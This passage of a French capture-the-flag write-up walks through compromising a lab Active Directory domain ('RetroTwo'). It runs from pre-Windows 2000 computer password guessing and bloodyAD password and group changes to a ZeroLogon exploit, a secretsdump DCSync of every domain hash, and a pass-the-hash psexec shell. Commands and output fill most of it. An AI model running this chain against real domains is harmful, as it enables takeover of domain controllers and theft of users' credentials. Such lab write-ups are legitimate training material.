$krb5tgs$23$*FS02$$RETRO2.VL$FS02$*$ea21f3ab68b839608fd45dc4a00e2011$7d03fb0e3716fdc4b1e935a6b41284938eee956e0f22a4fb713058709457319944d02b21426ae082aa8f07ac837b75b98ef5b880ae1960bd19f9255bb95f1defb1a7f638f4e722bb5047a51cfaae253c16dbd5763d5cdb6c7cbae18dab12a54d18ddce90737b7deec65adf87ecafae37671cd76fcdfe7593ce4a71b5aaf94b3ff1e36b72ba77d468ec17c2efa4a54c5446f437e3ca33ba75ba6749980d1c2bd1743f9f81de2349d7a4dffd13defd2b1cdf1a09401a17599411d430295e3c8a3cc07a147f8b7ec146cb4721411474991a3e97442613d2c7f2a0669c79ad93bbade328be1f7d1feda6c0857f6b1f02ff329d5d0091099c4e9721b350da5e2542b8a438d15f560d18df2229cf1f7693c20425266c157fb963f56324b2185f87d26a98f5c608570f5d1815c5db15062cc67f31a2428f1b2f7817e27faa772229c3990c90c3e857a52e73cdfde475c0136d3c8c810c5701194485cc479bf62f97ac99a614784256cc59c68074cdb5955edaba5f4ec373d1316fc387ede02cf51164d1768a49f707a6f6d838168334af35c7a474f2cf1805b0a6ce3f209dd0f1e4f80fd62499fc5473495e62585baa94b495c2c242a7b3e7282b0dd44240fc42d1dde29c4fd117bf42ef84036cb448bbc9cd65e2a50a583dd3795f06db22381fbdd14ace35d6611a4d5bf25afb0cedda52c2c5158ed7dc2a6e353f404b7d2210dc9e7bd3aaf4a4a61b9470bfc93181b0c4cb96cc1f1f2fc08ccbd7875d52543ea024257a88dcf54347af18ec9d473baf91249657ba7881ba3ba02fc9a3e754300b0cab194626ce67b6dd55421302a7456a4a147bae3aa281b9074b59bd9af628de80eb66bfd94ee935d083f1a4c600c2cd3c21d1c6ddb23ab6d77653502f0277701b868ff8bcb5bc3f59885fb70bff1f894522926bc66d03bcc4b0ce1c70ad7ed2d3dbd1ddbd700cb1e8b07f6e9f631b7b9f1ddda76e608721df95a8d1c9d0117897d237eb7c2af7666fc4840a1ed1107deb51a3296612649c033825c016686a08491cb7e10a76782c89c2b7e0673f7d65ecf72f3795cceb5d457e3579e505ac6d2cf684465937f49ab7a73de540c7a7453c7bb973546d70fa08d01585654ed9bba467b1445acc5a305716f53ae2f1d2afb267c83c5c55090ad8d3a7126f5b0978f91796f72cc8bfed5ed9731048eedf4e0e46819454d2efd51dac1e3e23e1cc2772b23aff1999787937f1330fcb31656c53099237d2fa9af594f639d31393b010d0080894a1dddd302bbe1667e6607c4ad2f88991452c
```

Mais cela ne sert à rien car je n'ai pas réussi à les cracker ni avec `john` ni `hashcat`.
```bash
╭─root@exegol-hackthebox /workspace/RetroTwo
╰─➤  john --wordlist=`fzf-wordlists` Kerberoastables.txt
Using default input encoding: UTF-8
Loaded 5 password hashes with 5 different salts (krb5tgs, Kerberos 5 TGS-REP etype 23 [MD4 HMAC-MD5 RC4])
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
0g 0:00:00:09 DONE (2025-07-28 20:58) 0g/s 1489Kp/s 7447Kc/s 7447KC/s !Sketchy!..*7¡Vamos!
Session completed.

```

### Pre-Wiindows 2000 computers
Mais je remarque que ce sont tous des comptes machines à l'exception du compte `krgtgt`. Donc leur mot de passe doit être faible. Peut être qu'ils sont configurés [Pre-Windows 2000 computers](https://www.thehacker.recipes/ad/movement/builtins/pre-windows-2000-computers#pre-windows-2000-computers) . C'est toujours bon de vérifier. Donc je créé une liste de compte machines ainsi que de mots de passe. Je teste les combinaisons et je trouve l'erreur `STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT` sur les combinaisons `fs01$:fs01` et `fs02$:fs02`. Ce qui confirme qu'ils sont bien configurés comme [Pre-Windows 2000 computers](https://www.thehacker.recipes/ad/movement/builtins/pre-windows-2000-computers#pre-windows-2000-computers).
```bash
╭─root@exegol-hackthebox /workspace/RetroTwo
╰─➤  cat computers.lst
FS01$
FS02$
BLN01$
ADMWS01$
╭─root@exegol-hackthebox /workspace/RetroTwo
╰─➤  cat computers-pass.lst
fs01
fs02
bln01
admws01
╭─root@exegol-hackthebox /workspace/RetroTwo
╰─➤  nxc smb bln01.retro2.vl -u computers.lst -p computers-pass.lst --continue-on-success
SMB         10.129.7.125    445    BLN01            [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:BLN01) (domain:retro2.vl) (signing:True) (SMBv1:True)
SMB         10.129.7.125    445    BLN01            [-] retro2.vl\FS01$:fs01 STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT
SMB         10.129.7.125    445    BLN01            [-] retro2.vl\FS02$:fs01 STATUS_LOGON_FAILURE
SMB         10.129.7.125    445    BLN01            [-] retro2.vl\BLN01$:fs01 STATUS_LOGON_FAILURE
SMB         10.129.7.125    445    BLN01            [-] retro2.vl\ADMWS01$:fs01 STATUS_LOGON_FAILURE
SMB         10.129.7.125    445    BLN01            [-] retro2.vl\FS01$:fs02 STATUS_LOGON_FAILURE
SMB         10.129.7.125    445    BLN01            [-] retro2.vl\FS02$:fs02 STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT
SMB         10.129.7.125    445    BLN01            [-] retro2.vl\BLN01$:fs02 STATUS_LOGON_FAILURE
SMB         10.129.7.125    445    BLN01            [-] retro2.vl\ADMWS01$:fs02 STATUS_LOGON_FAILURE
SMB         10.129.7.125    445    BLN01            [-] retro2.vl\FS01$:bln01 STATUS_LOGON_FAILURE
SMB         10.129.7.125    445    BLN01            [-] retro2.vl\FS02$:bln01 STATUS_LOGON_FAILURE
SMB         10.129.7.125    445    BLN01            [-] retro2.vl\BLN01$:bln01 STATUS_LOGON_FAILURE
SMB         10.129.7.125    445    BLN01            [-] retro2.vl\ADMWS01$:bln01 STATUS_LOGON_FAILURE
SMB         10.129.7.125    445    BLN01            [-] retro2.vl\FS01$:admws01 STATUS_LOGON_FAILURE
SMB         10.129.7.125    445    BLN01            [-] retro2.vl\FS02$:admws01 STATUS_LOGON_FAILURE
SMB         10.129.7.125    445    BLN01            [-] retro2.vl\BLN01$:admws01 STATUS_LOGON_FAILURE
SMB         10.129.7.125    445    BLN01            [-] retro2.vl\ADMWS01$:admws01 STATUS_LOGON_FAILURE

```

J'essais de me connecter alors mais cela ne fonctionne pas. Il me suffit alors d'utiliser l'option `-k` pour me connecter par Kerberos.
```bash
╭─root@exegol-hackthebox /workspace/RetroTwo
╰─➤  nxc smb bln01.retro2.vl -u 'fs01$' -p 'fs01'
SMB         10.129.7.125    445    BLN01            [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:BLN01) (domain:retro2.vl) (signing:True) (SMBv1:True)
SMB         10.129.7.125    445    BLN01            [-] retro2.vl\fs01$:fs01 STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT
╭─root@exegol-hackthebox /workspace/RetroTwo
╰─➤  nxc smb bln01.retro2.vl -u 'fs01$' -p 'fs01' -k
SMB         bln01.retro2.vl 445    BLN01            [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:BLN01) (domain:retro2.vl) (signing:True) (SMBv1:True)
SMB         bln01.retro2.vl 445    BLN01            [+] retro2.vl\fs01$:fs01

```

Je vois ensuite que `fs01$` peut changer le mot de passe de `admws01$`. Ce dernier peut s'ajouter dans le groupe `Services` qui est membre du groupe `Remote Desktop Users`.
![](/images/RetroTwo/RetroTwo-4.png)

### Ajout de admw01$ dans le groupe Services
Je génère d'abord un nouveau fichier `/etc/krb5.conf`.
```bash
╭─root@exegol-hackthebox /workspace/RetroTwo
╰─➤  nxc smb bln01.retro2.vl -u 'ldapreader' -p 'ppYaVcB5R' --generate-krb5-file /etc/krb5.conf                                             1 ↵
SMB         10.129.7.125    445    BLN01            [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:BLN01) (domain:retro2.vl) (signing:True) (SMBv1:True)
SMB         10.129.7.125    445    BLN01            [+] retro2.vl\ldapreader:ppYaVcB5R

```

Ensuite je génère un TGT pour `fs01$`.
```bash
╭─root@exegol-hackthebox /workspace/RetroTwo
╰─➤  getTGT.py 'retro2.vl/fs01$:fs01'
Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in fs01$.ccache
╭─root@exegol-hackthebox /workspace/RetroTwo
╰─➤  export KRB5CCNAME=fs01\$.ccache
╭─root@exegol-hackthebox /workspace/RetroTwo
╰─➤  klist
Ticket cache: FILE:fs01$.ccache
Default principal: fs01$@RETRO2.VL

Valid starting       Expires              Service principal
07/28/2025 21:37:53  07/29/2025 07:37:53  krbtgt/RETRO2.VL@RETRO2.VL
        renew until 07/29/2025 21:37:53

```

Puis avec `bloodyAD`, je change le mot de passe de `admws01$`.
```bash
╭─root@exegol-hackthebox /workspace/RetroTwo
╰─➤  bloodyAD --host 'bln01.retro2.vl' -d 'retro2.vl' -k -u 'fs01$' -p 'fs01' set password 'admws01$' 'Password@2025'                       1 ↵
[+] Password changed successfully!
```

Enfin j'ajoute `admws01$` dans le groupe `Services`.
```bash
╭─root@exegol-hackthebox /workspace/RetroTwo
╰─➤  bloodyAD --host 'bln01.retro2.vl' -d 'retro2.vl' -k -u 'admws01$' -p 'Password@2025' add groupMember 'services' 'admws01$'             2 ↵
[+] admws01$ added to services

```

### Connexion par RDP
Je vois que je ne peux admws01$ en peut pas se connecter par RDP.
```bash
╭─root@exegol-hackthebox /workspace/RetroTwo
╰─➤  nxc rdp bln01.retro2.vl -u 'admws01$' -p 'Password@2025' --no-bruteforce
RDP         10.129.7.125    3389   bln01.retro2.vl  [*] Probably old, doesn't not support HYBRID or HYBRID_EX (nla:False)
RDP         10.129.7.125    3389   bln01.retro2.vl  [-] None\admws01$:Password@2025 ([Errno 104] Connection reset by peer)

╭─root@exegol-hackthebox /workspace/RetroTwo
╰─➤  xfreerdp /d:"retro2.vl" /u:"admws01$" /p:"Password@2025" /v:"bln01.retro2.vl" /dynamic-resolution /tls-seclevel:0
```

Donc je décide d'ajouter `ldapreader` dans le groupe Services pour que lui puissent acceder à la machine par RDP
```bash
╭─root@exegol-hackthebox /workspace/RetroTwo
╰─➤  bloodyAD --host 'bln01.retro2.vl' -d 'retro2.vl' -k -u 'admws01$' -p 'Password@2025' add groupMember 'services' 'ldapreader'
[+] ldapreader added to services

```

Je me connecte alors par RDP et je récupère le flag user.
```bash
 xfreerdp /d:"retro2.vl" /u:"ldapreader" /p:"ppYaVcB5R" /v:"bln01.retro2.vl" /dynamic-resolution /tls-seclevel:0
```
![](/images/RetroTwo/RetroTwo-5.png)

## Shell en tant qu'administrateur
### Zerologon
Avec `systeminfo`, je vois que nous sommes sur une vieille machine. C'est une `Windows 7 version 6.1.7601`
![](/images/RetroTwo/RetroTwo-6.png)

Là, je demande à `ChatGPT` les potentielles vulnérabilités qu'il pourrait avoir sur un système aussi vieux. La `ZeroLogon` est celle qui m'a parue la plus simple à vérifier. Donc sur [TheHackerRecipes](https://www.thehacker.recipes/ad/movement/netlogon/zerologon#resources) je vois comment vérifier si un système y est vulnérable. Et il se trouve que cette machine l'est.
```bash
╭─root@exegol-hackthebox /workspace/RetroTwo
╰─➤  zerologon-scan.py 'bln01' '10.129.7.125'                                                                                               2 ↵
Performing authentication attempts...
========================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================
Success! DC can be fully compromised by a Zerologon attack.

```

Donc j'utilise le script, `zerologon-exploit.py` pour exploiter cette vulnérabilité.
```bash
╭─root@exegol-hackthebox /workspace/RetroTwo
╰─➤  zerologon-exploit.py 'bln01' '10.129.7.125'
Performing authentication attempts...
==========================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================
Target vulnerable, changing account password to empty string

Result: 0

Exploit complete!
```

### DCSync
Je récupère ensuite les hash de tous les utilisateurs avec `secretsdump`.
```bash
╭─root@exegol-hackthebox /workspace/RetroTwo
╰─➤  secretsdump -no-pass 'retro2.vl'/'bln01$'@'bln01.retro2.vl'
Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c06552bdb50ada21a7c74536c231b848:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1e242a90fb9503f383255a4328e75756:::
admin:1000:aad3b435b51404eeaad3b435b51404ee:49c31c8f60320b9f416bc248231c008c:::
Julie.Martin:1105:aad3b435b51404eeaad3b435b51404ee:cf4999af837f40d72d1c5bcec27ba9b6:::
Clare.Smith:1106:aad3b435b51404eeaad3b435b51404ee:a7c82ec08414f0c54637fad20b9aac9e:::
Laura.Davies:1107:aad3b435b51404eeaad3b435b51404ee:ee74607fad6d8c51b0d488e322f82317:::
Rhys.Richards:1108:aad3b435b51404eeaad3b435b51404ee:09377f210fdbdcda6f97eda91ddc6879:::
Leah.Robinson:1109:aad3b435b51404eeaad3b435b51404ee:6333c620221c04d8fb5b6d7ca8b6d6d7:::
Michelle.Bird:1110:aad3b435b51404eeaad3b435b51404ee:c823220a9bda3ca70ebe7362187c9004:::
Kayleigh.Stephenson:1111:aad3b435b51404eeaad3b435b51404ee:a78835f0139b3b206f9598fe9c18d707:::
Charles.Singh:1112:aad3b435b51404eeaad3b435b51404ee:432119e62a10aff8c8200e4f45e772a0:::
Sam.Humphreys:1113:aad3b435b51404eeaad3b435b51404ee:3c1508fc774de1e6040c68b41a17fdee:::
Margaret.Austin:1114:aad3b435b51404eeaad3b435b51404ee:c6ebda46b0b014eda3ffcb8d92d179d9:::
Caroline.James:1115:aad3b435b51404eeaad3b435b51404ee:80835fee4ce88524f63a0ecf60870ac0:::
Lynda.Giles:1116:aad3b435b51404eeaad3b435b51404ee:dbf17856bd378ec410c20b98a749571f:::
Emily.Price:1117:aad3b435b51404eeaad3b435b51404ee:9cdf1d59674a6ddfedef2ae2545d3862:::
Lynne.Dennis:1118:aad3b435b51404eeaad3b435b51404ee:4b690295089b91881633113f13c866ee:::
Alexandra.Black:1119:aad3b435b51404eeaad3b435b51404ee:3349f04c2fdcf796a66c37b2a7658ae6:::
Alex.Scott:1120:aad3b435b51404eeaad3b435b51404ee:200155446e3b3817e8bc857dfe01b58c:::
Mandy.Davies:1121:aad3b435b51404eeaad3b435b51404ee:c144842c62c3051b8f1b8467ec62ef1f:::
Marilyn.Whitehouse:1122:aad3b435b51404eeaad3b435b51404ee:097b5b5b97e2a3b07db0b3deac5cd303:::
Lindsey.Harrison:1123:aad3b435b51404eeaad3b435b51404ee:261b8b9c79b19345e8ea15dcdfc03ecd:::
Sally.Davey:1124:aad3b435b51404eeaad3b435b51404ee:78ac830ac29ae1df8fa569b39515d5a5:::
retro2.vl\inventory:1128:aad3b435b51404eeaad3b435b51404ee:46b019644dde01251e7044a3d4185bd1:::
retro2.vl\ldapreader:1130:aad3b435b51404eeaad3b435b51404ee:fe63aaefd1cfd29d7cc5c14321a725f3:::
BLN01$:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
ADMWS01$:1127:aad3b435b51404eeaad3b435b51404ee:7e9670f23027f89b62a006b3bf28f746:::
FS01$:1131:aad3b435b51404eeaad3b435b51404ee:44a59c02ec44a90366ad1d0f8a781274:::
FS02$:1132:aad3b435b51404eeaad3b435b51404ee:eb354224f433cd7cd824b1fdce8c0795:::
```

L'administrateur n'a pas le droit de se connecter par RDP.
```bash
xfreerdp /d:"retro2.vl" /u:"administrator" /pth:c06552bdb50ada21a7c74536c231b848 /v:"bln01.retro2.vl" /dynamic-resolution /tls-seclevel:0
```
![](/images/RetroTwo/RetroTwo-7.png)

Mais je peux obtenir un shell avec le module `psexec` de `Impacket`.
```bash
╭─root@exegol-hackthebox /workspace/RetroTwo
╰─➤  psexec.py -hashes :"c06552bdb50ada21a7c74536c231b848" "retro2.vl"/"administrator"@"bln01.retro2.vl"                                  130 ↵
Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies

[*] Requesting shares on bln01.retro2.vl.....
[*] Found writable share ADMIN$
[*] Uploading file ZCTjGyjv.exe
[*] Opening SVCManager on bln01.retro2.vl.....
[*] Creating service UcGI on bln01.retro2.vl.....
[*] Starting service UcGI.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
cb462daa07d7539de053bb9308658759
C:\Windows\system32>
```
